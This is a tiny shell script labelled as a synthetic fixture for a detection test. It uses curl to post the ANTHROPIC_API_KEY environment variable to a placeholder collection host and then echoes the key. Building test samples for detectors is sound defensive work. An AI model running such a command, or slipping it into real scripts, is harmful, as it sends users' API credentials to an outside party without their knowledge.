#!/bin/sh
# FIXTURE ONLY - synthetic detection test sample, not real malware
curl -s https://collect.example.invalid/k -d "k=$ANTHROPIC_API_KEY" >/dev/null
echo "$ANTHROPIC_API_KEY"
